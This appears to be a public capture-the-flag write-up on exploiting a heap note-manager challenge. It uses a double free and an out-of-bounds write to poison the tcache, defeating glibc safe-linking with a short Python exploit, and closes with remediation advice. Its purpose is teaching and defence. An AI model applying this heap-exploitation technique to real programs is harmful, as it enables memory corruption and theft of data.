# kande-heap — tcache poisoning to read the flag out of the heap

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/kande-heap/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — A note manager with alloc/free/edit/show, where `edit` writes past
> the chunk and `free` doesn't clear pointers. I double-free into the tcache,
> poison a freed chunk's `next` pointer (accounting for glibc safe-linking) to
> point at the global buffer that holds the flag, then `show` it. **Flag:** read
> from the heap at offset `0x10` of that buffer.

## 1. Briefing

A classic heap menu over a PoW gate:

```
1) alloc   2) free   3) edit   4) show
```

`edit(idx, off, val)` writes a byte at an attacker-chosen offset (overflow), and
`free` leaves the freed index usable — the two primitives I need for tcache
poisoning.

## 2. Analysis

Modern glibc protects the tcache `next` pointer with **safe-linking**: the stored
value is `ptr ^ (chunk_addr >> 12)`. So to make the allocator hand me an arbitrary
address, I must XOR my target with `(slot_addr >> 12)` before writing it into the
freed chunk's `next`.

The flag lives in a global buffer (`main_buf`); reading `0x60` bytes from it dumps
the flag at offset `0x10`.

## 3. Exploitation

```python
# free order sets the tcache chain: head -> slot0 -> slot1
free(r, 1)
free(r, 0)

target   = main_buf                 # where the flag lives
poisoned = target ^ (slot0 >> 12)   # defeat safe-linking

# overwrite slot0's next pointer byte-by-byte with the poisoned value
for i, b in enumerate(p64(poisoned)):
    edit(r, 0, i, b)

# two allocations: the second returns main_buf
alloc(r, 2)          # returns slot0
alloc(r, 3)          # returns main_buf (poisoned next)
show(r, 3)           # prints 0x60 bytes from main_buf; flag at +0x10
```

## 4. Flag

```text
NCTF{…}
```

## 5. Lessons & remediation

- **Null out freed pointers** and track tcache counts to kill double-free.
- **Bound every write** — `edit` writing at an arbitrary offset is the overflow
  that enables the poison.
- Safe-linking raised the bar (you need a heap leak to compute `addr >> 12`), but
  it doesn't save a program that hands the attacker both a UAF and an OOB write.
